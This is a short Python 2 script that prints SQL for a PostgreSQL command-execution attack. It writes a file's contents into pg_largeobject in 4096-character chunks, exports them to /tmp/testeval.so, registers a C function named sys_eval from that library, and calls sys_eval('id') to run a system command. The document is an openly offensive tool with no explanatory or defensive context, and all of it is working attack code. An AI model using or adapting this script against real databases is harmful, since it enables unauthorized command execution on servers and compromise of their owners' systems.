#~/usr/bin/env python2
#-*- coding:utf-8 -*-
import sys
from random import randint
number = randint(1000, 9999)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print "Usage:python " + sys.argv[0] + "inputfile"
        sys.exit()
    fileobj = open(sys.argv[1],'rb')
    i = 0
    t = -1
    s = ''
    print 'SELECT lo_create({number});'.format(number=number)
    for b in fileobj.read():
        i = i + 1
        s += b
        if i % 4096 == 0:
            t = t + 1
            print 'insert into pg_largeobject values ({number}, {block}, decode(\'{payload}\',\'hex\'));\n'\
                    .format(number=number, block=t, payload=s)
            s = ''
    t=t+1
    print 'insert into pg_largeobject values ({number}, {block}, decode(\'{payload}\',\'hex\'));\n'.format(number=number, block=t, payload=s)

    print 'SELECT lo_export({number}, \'/tmp/testeval.so\');'.format(number=number)

    print 'CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS \'/tmp/testeval.so\', \'sys_eval\' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;'

    print 'select sys_eval(\'id\');'

    fileobj.close()